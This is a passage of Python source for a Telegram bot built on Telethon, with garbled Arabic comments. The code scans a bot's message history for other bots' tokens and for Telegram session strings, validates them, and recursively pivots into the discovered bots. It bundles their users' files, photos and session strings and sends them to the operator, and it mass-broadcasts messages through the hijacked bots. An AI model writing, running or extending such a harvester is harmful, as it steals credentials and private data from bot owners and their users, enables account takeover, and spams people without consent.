                    # Ø¬Ù…Ø¹ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¹Ø±ÙØ§Øª Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„
                    if hasattr(msg, 'from_id') and msg.from_id:
                        user_id_str = str(msg.from_id.user_id) if hasattr(msg.from_id, 'user_id') else str(msg.from_id)
                        users.add(user_id_str)
                    
                    # Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ø±ÙØ§Øª Ù…Ù† Ø§Ù„Ø±Ø¯ÙˆØ¯
                    if hasattr(msg, 'reply_to') and msg.reply_to:
                        if hasattr(msg.reply_to, 'from_id') and msg.reply_to.from_id:
                            reply_user_id = str(msg.reply_to.from_id.user_id) if hasattr(msg.reply_to.from_id, 'user_id') else str(msg.reply_to.from_id)
                            users.add(reply_user_id)
                    
                    # Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ø±ÙØ§Øª Ù…Ù† Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ ÙÙŠ Ø§Ù„Ù…Ø­Ø§Ø¯Ø«Ø§Øª
                    if hasattr(msg, 'peer_id'):
                        if hasattr(msg.peer_id, 'user_id'):
                            users.add(str(msg.peer_id.user_id))
                        elif hasattr(msg.peer_id, 'chat_id'):
                            users.add(str(msg.peer_id.chat_id))
                        elif hasattr(msg.peer_id, 'channel_id'):
                            users.add(str(msg.peer_id.channel_id))
            
            except Exception as e:
                print(f"Error processing messages {i}-{i+batch_size}: {e}")
                continue
        
        await temp_bot.disconnect()
        
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except:
            pass
        
        user_list = list(users)
        # ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù†ØªÙŠØ¬Ø© ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        await set_cached_users(bot_token, user_list)
        return user_list
        
    except Exception as e:
        print(f"Error extracting users: {e}")
        return []

async def save_user_ids_to_file(user_ids, filename="user_ids.txt"):
    """Ø­ÙØ¸ Ù…Ø¹Ø±ÙØ§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† ÙÙŠ Ù…Ù„Ù Ù†ØµÙŠ"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            for user_id in user_ids:
                f.write(f"{user_id}\n")
        return True
    except Exception as e:
        print(f"Error saving user IDs to file: {e}")
        return False

async def broadcast_message(bot_token, user_ids, message_text, progress_callback=None, stop_event=None):
    """Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Ù‚Ø§Ø¦Ù…Ø© Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†"""
    try:
        temp_session = os.path.join(SESSION_DIR, f"broadcast_bot_{int(time.time())}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=bot_token)
        
        success_count = 0
        failed_count = 0
        total_users = len(user_ids)
        last_update_time = 0
        
        for i, user_id in enumerate(user_ids):
            if stop_event and stop_event.is_set():
                break
                
            try:
                await with_telegram_retry(lambda: temp_bot.send_message(int(user_id), message_text))
                success_count += 1
            except Exception as e:
                print(f"Error sending to user {user_id}: {e}")
                failed_count += 1
            
            # Ø¥ÙŠÙ‚Ø§Ù Ù…Ø¤Ù‚Øª ÙƒÙ„ 500 Ø±Ø³Ø§Ù„Ø© Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø¹Ø¯Ø¯ Ø£ÙƒØ«Ø± Ù…Ù† 1000
            if total_users > 1000 and (i + 1) % 500 == 0:
                await asyncio.sleep(5)
                await asyncio.sleep(2)
            
            # ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ‚Ø¯Ù… ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ Ø£Ùˆ Ø¹Ù†Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡
            current_time = time.time()
            if progress_callback and (current_time - last_update_time >= 5 or i + 1 == total_users):
                last_update_time = current_time
                if not await progress_callback(i + 1, total_users):
                    break
            
            await asyncio.sleep(SEND_DELAY)
        
        await temp_bot.disconnect()
        
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except:
            pass
        
        return success_count, failed_count
        
    except Exception as e:
        print(f"Error in broadcast: {e}")
        return 0, total_users

async def deep_network_analysis(main_bot_token, user_id, progress_callback=None, stop_event=None):
    """ØªØ­Ù„ÙŠÙ„ Ø´Ø¨ÙƒØ© Ø§Ù„Ø¨ÙˆØªØ§Øª Ø¨Ø´ÙƒÙ„ Ù…ØªØ¹Ù…Ù‚ Ù…Ø¹ Ø§Ù„ØªÙØ±Ø¹"""
    try:
        # ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ
        main_analysis = await analyze_bot(main_bot_token, user_id)
        if not main_analysis['success']:
            return {'success': False, 'error': 'ÙØ´Ù„ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ'}
        
        all_bots = [{
            'token': main_bot_token,
            'analysis': main_analysis,
            'level': 0
        }]
        
        total_bots = 1
        processed_bots = 0
        last_update_time = 0
        
        # Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ù…Ø¬Ù…Ø¹Ø©
        aggregated_stats = {
            'total_bots': 1,
            'total_users': main_analysis['total_users'],
            'total_files': main_analysis['total_files'],
            'total_photos': main_analysis['total_photos'],
            'total_tokens': main_analysis['tokens']['total'],
            'valid_tokens': main_analysis['tokens']['valid'],
            'total_sessions': main_analysis['sessions']['total'],
            'all_users': list(main_analysis['user_ids']),  # ØªØ­ÙˆÙŠÙ„ set Ø¥Ù„Ù‰ list
            'all_files': main_analysis['files'],
            'all_photos': main_analysis['photos'],
            'all_tokens': main_analysis['tokens']['details'],
            'all_sessions': main_analysis['sessions']['details']
        }
        
        # ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ØªÙØ±Ø¹Ø©
        current_level = 0
        max_levels = 10  # Ø£Ù‚ØµÙ‰ Ø¹Ù…Ù‚ Ù„Ù„ØªÙØ±Ø¹
        
        while current_level < max_levels:
            current_level_bots = [bot for bot in all_bots if bot['level'] == current_level]
            
            for bot_data in current_level_bots:
                # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø·Ù„Ø¨ Ø§Ù„Ø¥ÙŠÙ‚Ø§Ù
                if stop_event and stop_event.is_set():
                    print("â¹ ØªÙ… Ø·Ù„Ø¨ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø¨ÙƒÙŠ")
                    # Ù†Ø¹ÙˆØ¯ Ø¨Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ø­Ø§Ù„ÙŠØ© Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ø§Ù„ÙƒØ§Ù…Ù„
                    return {
                        'success': True,
                        'aggregated_stats': aggregated_stats,
                        'all_bots': all_bots,
                        'total_levels': current_level,
                        'partial': True,
                        'message': 'ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ù‚Ø¨Ù„ Ø§ÙƒØªÙ…Ø§Ù„Ù‡'
                    }
                
                current_tokens = bot_data['analysis']['tokens']['details']
                
                for token_info in current_tokens:
                    # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø·Ù„Ø¨ Ø§Ù„Ø¥ÙŠÙ‚Ø§Ù Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ø¯Ø§Ø®Ù„ Ø§Ù„Ø­Ù„Ù‚Ø©
                    if stop_event and stop_event.is_set():
                        print("â¹ ØªÙ… Ø·Ù„Ø¨ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø¨ÙƒÙŠ")
                        return {
                            'success': True,
                            'aggregated_stats': aggregated_stats,
                            'all_bots': all_bots,
                            'total_levels': current_level,
                            'partial': True,
                            'message': 'ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ù‚Ø¨Ù„ Ø§ÙƒØªÙ…Ø§Ù„Ù‡'
                        }
                    
                    if token_info['valid']:
                        token = token_info['token']
                        
                        # ØªØ¬Ù†Ø¨ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ÙƒØ±Ø±Ø©
                        if any(b['token'] == token for b in all_bots):
                            continue
                        
                        # ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø¬Ø¯ÙŠØ¯
                        new_analysis = await analyze_bot(token, user_id)
                        if new_analysis['success']:
                            new_bot = {
                                'token': token,
                                'analysis': new_analysis,
                                'level': current_level + 1
                            }
                            all_bots.append(new_bot)
                            
                            # ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ù…Ø¬Ù…Ø¹Ø©
                            aggregated_stats['total_bots'] += 1
                            aggregated_stats['total_users'] += new_analysis['total_users']
                            aggregated_stats['total_files'] += new_analysis['total_files']
                            aggregated_stats['total_photos'] += new_analysis['total_photos']
                            aggregated_stats['total_tokens'] += new_analysis['tokens']['total']
                            aggregated_stats['valid_tokens'] += new_analysis['tokens']['valid']
                            aggregated_stats['total_sessions'] += new_analysis['sessions']['total']
                            
                            # Ø¯Ù…Ø¬ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† (ØªØ­ÙˆÙŠÙ„ set Ø¥Ù„Ù‰ list)
                            aggregated_stats['all_users'] = list(set(aggregated_stats['all_users'] + new_analysis['user_ids']))
                            
                            # Ø¯Ù…Ø¬ Ø§Ù„Ù…Ù„ÙØ§Øª ÙˆØ§Ù„ØµÙˆØ±
                            aggregated_stats['all_files'].extend(new_analysis['files'])
                            aggregated_stats['all_photos'].extend(new_analysis['photos'])
                            
                            # Ø¯Ù…Ø¬ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª ÙˆØ§Ù„Ø¬Ù„Ø³Ø§Øª
                            aggregated_stats['all_tokens'].extend(new_analysis['tokens']['details'])
                            aggregated_stats['all_sessions'].extend(new_analysis['sessions']['details'])
                            
                            processed_bots += 1
                            total_bots += 1
                            
                            # ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ‚Ø¯Ù…
                            current_time = time.time()
                            if progress_callback and (current_time - last_update_time >= 5):
                                last_update_time = current_time
                                if not await progress_callback(processed_bots, total_bots, current_level + 1):
                                    break
            
            current_level += 1
            if current_level >= max_levels:
                break
        
        return {
            'success': True,
            'aggregated_stats': aggregated_stats,
            'all_bots': all_bots,
            'total_levels': current_level,
            'partial': False,
            'message': 'ØªÙ… Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ Ù…Ù† Ø§Ù„ÙØ­Øµ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„'
        }
        
    except Exception as e:
        print(f"Error in deep network analysis: {e}")
        return {'success': False, 'error': str(e)}
        
async def network_broadcast(all_bots_data, message_text, progress_callback=None, stop_event=None):
    """Ø¥Ø°Ø§Ø¹Ø© Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©"""
    total_bots = len(all_bots_data)
    total_success = 0
    total_failed = 0
    
    last_update_time = 0
    
    for i, bot_data in enumerate(all_bots_data):
        if stop_event and stop_event.is_set():
            break
            
        try:
            users = bot_data['analysis']['user_ids']
            success, failed = await broadcast_message(
                bot_data['token'],
                users,
                message_text
            )
            
            total_success += success
            total_failed += failed
            
            # ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ‚Ø¯Ù…
            current_time = time.time()
            if progress_callback and (current_time - last_update_time >= 5 or i + 1 == total_bots):
                last_update_time = current_time
                if not await progress_callback(i + 1, total_bots, total_success, total_failed):
                    break
                    
        except Exception as e:
            print(f"Error broadcasting to bot {i}: {e}")
            total_failed += len(bot_data['analysis']['user_ids'])
    
    return total_success, total_failed

async def network_send_files(main_bot, all_bots_data, user_id):
    """Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©"""
    try:
        all_files = []
        for bot_data in all_bots_data:
            all_files.extend(bot_data['analysis']['files'])
        
        if not all_files:
            return False
        
        # ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª
        zip_buffer = io.BytesIO()
        success_count = 0
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for bot_data in all_bots_data:
                if not bot_data['analysis']['files']:
                    continue
                    
                temp_session = os.path.join(SESSION_DIR, f"network_files_{int(time.time())}")
                temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
                await temp_bot.start(bot_token=bot_data['token'])
                
                for file_info in bot_data['analysis']['files']:
                    if await download_and_add_to_zip(temp_bot, file_info, zip_file, 'document'):
                        success_count += 1
                
                await temp_bot.disconnect()
                
                try:
                    if os.path.exists(f"{temp_session}.session"):
                        os.remove(f"{temp_session}.session")
                except:
                    pass
        
        zip_buffer.seek(0)
        
        if success_count > 0:
            await main_bot.send_file(
                entity=int(user_id),
                file=zip_buffer,
                caption=f"ğŸ“¦ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ© ({success_count} Ù…Ù„ÙØ§Øª)",
                attributes=[DocumentAttributeFilename("network_files.zip")]
            )
            return True
        
        return False
        
    except Exception as e:
        print(f"Error sending network files: {e}")
        return False

async def network_send_photos(main_bot, all_bots_data, user_id):
    """Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©"""
    try:
        all_photos = []
        for bot_data in all_bots_data:
            all_photos.extend(bot_data['analysis']['photos'])
        
        if not all_photos:
            return False
        
        # ØªØ¬Ù…ÙŠØ¹ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª
        zip_buffer = io.BytesIO()
        success_count = 0
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for bot_data in all_bots_data:
                if not bot_data['analysis']['photos']:
                    continue
                    
                temp_session = os.path.join(SESSION_DIR, f"network_photos_{int(time.time())}")
                temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
                await temp_bot.start(bot_token=bot_data['token'])
                
                for photo_info in bot_data['analysis']['photos']:
                    if await download_and_add_to_zip(temp_bot, photo_info, zip_file, 'photo'):
                        success_count += 1
                
                await temp_bot.disconnect()
                
                try:
                    if os.path.exists(f"{temp_session}.session"):
                        os.remove(f"{temp_session}.session")
                except:
                    pass
        
        zip_buffer.seek(0)
        
        if success_count > 0:
            await main_bot.send_file(
                entity=int(user_id),
                file=zip_buffer,
                caption=f"ğŸ–¼ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ© ({success_count} ØµÙˆØ±)",
                attributes=[DocumentAttributeFilename("network_photos.zip")]
            )
            return True
        
        return False
        
    except Exception as e:
        print(f"Error sending network photos: {e}")
        return False

async def network_send_tokens(main_bot, all_bots_data, user_id):
    """Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©"""
    try:
        all_tokens = []
        for bot_data in all_bots_data:
            all_tokens.extend(bot_data['analysis']['tokens']['details'])
        
        if not all_tokens:
            return False
        
        # ØªØ¬Ù…ÙŠØ¹ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„ØµØ§Ù„Ø­Ø© ÙÙ‚Ø·
        valid_tokens = [token for token in all_tokens if token['valid']]
        
        if not valid_tokens:
            await main_bot.send_message(user_id, "âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ ØªÙˆÙƒÙ†Ø§Øª ØµØ§Ù„Ø­Ø© ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©")
            return False
        
        # Ø¥Ø±Ø³Ø§Ù„ ÙƒÙ„ ØªÙˆÙƒÙ† Ù…Ø¹ Ø²Ø± Ø§Ù„Ø¥Ø°Ø§Ø¹Ø©
        for token_info in valid_tokens:
            token = token_info['token']
            bot_info = token_info['bot_info']
            
            message = (
                "ğŸ‰ ØªÙˆÙƒÙ† Ø¨ÙˆØª ØµØ§Ù„Ø­ Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©!\n\n"
                f"ğŸ” Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ØªÙˆÙƒÙ†:\n`{token}`\n\n"
                f"ğŸ¤– Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª:\n"
                f"â”œ Ø§Ù„Ø§Ø³Ù…: {bot_info.get('bot_name', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                f"â”œ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: @{bot_info.get('bot_username', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                f"â”œğŸ“©Ø¹Ø¯Ø¯ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {bot_info.get('total_messages', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                f"â”œğŸ‘¤Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {bot_info.get('total_users', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                f"â”” Ø§Ù„Ø¢ÙŠØ¯ÙŠ: {bot_info.get('bot_id', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}"
            )
            
            # Ø²Ø± Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ù…Ù† Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª
            broadcast_button = [[Button.inline("ğŸ“¢ Ø¥Ø°Ø§Ø¹Ø© Ù…Ù† Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª", f"token_broadcast:{token}")]]
            await main_bot.send_message(user_id, message, buttons=broadcast_button)
            await asyncio.sleep(0.5)
        
        return True
        
    except Exception as e:
        print(f"Error sending network tokens: {e}")
        return False

async def network_send_sessions(main_bot, all_bots_data, user_id):
    """Ø¥Ø±Ø³Ø§Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙÙŠ Ø§Ù„Ø´Ø¨ÙƒØ©"""
    try:
        all_sessions = []
        for bot_data in all_bots_data:
            all_sessions.extend(bot_data['analysis']['sessions']['details'])
        
        if not all_sessions:
            return False
        
        # ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„ÙØ±ÙŠØ¯Ø© Ù…Ø¹ Ø§Ù„Ø­ÙØ§Ø¸ Ø¹Ù„Ù‰ Ø§Ù„ØªØ±ØªÙŠØ¨
        unique_sessions = []
        seen_sessions = set()
        
        for i, session_info in enumerate(all_sessions):
            if 'session' in session_info and session_info['session'] not in seen_sessions:
                unique_sessions.append(session_info['session'])
                seen_sessions.add(session_info['session'])
                
                # Ø¥Ø¶Ø§ÙØ© Ø§Ù„ÙØ§ØµÙ„ Ø¨ÙŠÙ† Ø§Ù„Ø¬Ù„Ø³Ø§Øª (Ù…Ø§Ø¹Ø¯Ø§ Ø§Ù„Ø£Ø®ÙŠØ±Ø©)
                if i < len(all_sessions) - 1:
                    unique_sessions.append("\n" + "-" * 40 + "\n")
        
        if not unique_sessions:
            return False
        
        # ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª ÙÙŠ Ù…Ù„Ù zip
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            if unique_sessions:
                zip_file.writestr("sessions.txt", "".join(unique_sessions))
        
        zip_buffer.seek(0)
        
        await main_bot.send_file(
            entity=int(user_id),
            file=zip_buffer,
            caption="ğŸ” Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©",
            attributes=[DocumentAttributeFilename("network_sessions.zip")]
        )
        
        return True
        
    except Exception as e:
        print(f"Error sending network sessions: {e}")
        return False
        
        




# Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©


# Ù…Ø¹Ø§Ù„Ø¬Ø© Ø£Ø²Ø±Ø§Ø± Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„Ø¥Ø¶Ø§ÙÙŠØ©

# Ù…Ø¹Ø§Ù„Ø¬Ø© Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ù…Ù† Ù…Ù„Ù


# Ø¯ÙˆØ§Ù„ Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø³Ø±ÙŠØ¹
async def analyze_bot_for_sessions_only(bot_token, user_id):
    """ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ù„Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„Ø¬Ù„Ø³Ø§Øª ÙÙ‚Ø·"""
    try:
        temp_session = os.path.join(SESSION_DIR, f"analyze_sessions_{int(time.time())}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=bot_token)
        
        max_id = await find_max_message_id(temp_bot)
        sessions = {'total': 0, 'details': []}
        seen_sessions = set()
        
        # ØªÙ‚Ø³ÙŠÙ… Ø§Ù„Ø¹Ù…Ù„ Ø¥Ù„Ù‰ Ù…Ù‡Ø§Ù… Ù…ØªÙˆØ§Ø²ÙŠØ©
        tasks = []
        chunk_size = 100
        
        for i in range(1, max_id + 1, chunk_size):
            end_range = min(i + chunk_size, max_id + 1)
            tasks.append(process_message_chunk_for_sessions(temp_bot, i, end_range, sessions, seen_sessions))
        
        # ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù‡Ø§Ù… Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ
        await asyncio.gather(*tasks, return_exceptions=True)
        
        await temp_bot.disconnect()
        
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except:
            pass
        
        return {'success': True, 'sessions': sessions}
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def process_message_chunk_for_sessions(bot, start_id, end_id, sessions, seen_sessions):
    """Ù…Ø¹Ø§Ù„Ø¬Ø© Ø¬Ø²Ø¡ Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ù„Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„Ø¬Ù„Ø³Ø§Øª ÙÙ‚Ø·"""
    try:
        message_ids = list(range(start_id, end_id))
        messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)))
        
        for msg in messages.messages:
            if isinstance(msg, MessageEmpty):
                continue
            
            # Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø¬Ù„Ø³Ø§Øª ÙÙŠ Ø§Ù„Ù†Øµ
            if hasattr(msg, 'message') and msg.message:
                text = msg.message
                session_matches = SESSION_PATTERN_CHAT.findall(text)
                for session in session_matches:
                    if session not in seen_sessions:
                        seen_sessions.add(session)
                        sessions['total'] += 1
                        sessions['details'].append({
                            'session': session,
                            'source': 'chat'
                        })
            
            # Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø¬Ù„Ø³Ø§Øª ÙÙŠ Ø§Ù„Ù…Ù„ÙØ§Øª
            if hasattr(msg, 'media') and isinstance(msg.media, MessageMediaDocument):
                try:
                    document = msg.media.document
                    file_data = await download_with_retry(bot, InputDocumentFileLocation(
                        id=document.id,
                        access_hash=document.access_hash,
                        file_reference=document.file_reference,
                        thumb_size=''
                    ))
                    if file_data:
                        text_data = file_data.decode(errors="ignore")
                        session_matches = SESSION_PATTERN_CHAT.findall(text_data)
                        for session in session_matches:
                            if session not in seen_sessions:
                                seen_sessions.add(session)
                                sessions['total'] += 1
                                sessions['details'].append({
                                    'session': session,
                                    'source': 'file'
                                })
                except:
                    pass
                        
    except Exception as e:
        print(f"Error processing sessions chunk {start_id}-{end_id}: {e}")



async def analyze_bot_for_tokens_only(bot_token, user_id):
    """ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ù„Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª ÙÙ‚Ø·"""
    try:
        temp_session = os.path.join(SESSION_DIR, f"analyze_tokens_{int(time.time())}")
        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
        await temp_bot.start(bot_token=bot_token)
        
        max_id = await find_max_message_id(temp_bot)
        tokens = {'total': 0, 'valid': 0, 'details': []}
        seen_tokens = set()
        
        # ØªÙ‚Ø³ÙŠÙ… Ø§Ù„Ø¹Ù…Ù„ Ø¥Ù„Ù‰ Ù…Ù‡Ø§Ù… Ù…ØªÙˆØ§Ø²ÙŠØ©
        tasks = []
        chunk_size = 100
        
        for i in range(1, max_id + 1, chunk_size):
            end_range = min(i + chunk_size, max_id + 1)
            tasks.append(process_message_chunk_for_tokens(temp_bot, i, end_range, tokens, seen_tokens))
        
        # ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù‡Ø§Ù… Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø¨Ø´ÙƒÙ„ Ù…ØªÙˆØ§Ø²ÙŠ
        if tokens['details']:
            await validate_tokens_parallel(tokens['details'])
            tokens['valid'] = sum(1 for token in tokens['details'] if token['valid'])
        
        await temp_bot.disconnect()
        
        try:
            if os.path.exists(f"{temp_session}.session"):
                os.remove(f"{temp_session}.session")
        except:
            pass
        
        return {'success': True, 'tokens': tokens}
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def process_message_chunk_for_tokens(bot, start_id, end_id, tokens, seen_tokens):
    """Ù…Ø¹Ø§Ù„Ø¬Ø© Ø¬Ø²Ø¡ Ù…Ù† Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ù„Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª ÙÙ‚Ø·"""
    try:
        message_ids = list(range(start_id, end_id))
        messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)))
        
        for msg in messages.messages:
            if isinstance(msg, MessageEmpty):
                continue
            
            # Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª ÙÙŠ Ø§Ù„Ù†Øµ
            if hasattr(msg, 'message') and msg.message:
                text = msg.message
                token_matches = TOKEN_PATTERN.findall(text)
                for token in token_matches:
                    if token not in seen_tokens:
                        seen_tokens.add(token)
                        tokens['total'] += 1
                        tokens['details'].append({
                            'token': token,
                            'valid': False,
                            'bot_info': {}
                        })
            
            # Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª ÙÙŠ Ø§Ù„Ù…Ù„ÙØ§Øª
            if hasattr(msg, 'media') and isinstance(msg.media, MessageMediaDocument):
                try:
                    document = msg.media.document
                    file_data = await download_with_retry(bot, InputDocumentFileLocation(
                        id=document.id,
                        access_hash=document.access_hash,
                        file_reference=document.file_reference,
                        thumb_size=''
                    ))
                    if file_data:
                        text_data = file_data.decode(errors="ignore")
                        token_matches = TOKEN_PATTERN.findall(text_data)
                        for token in token_matches:
                            if token not in seen_tokens:
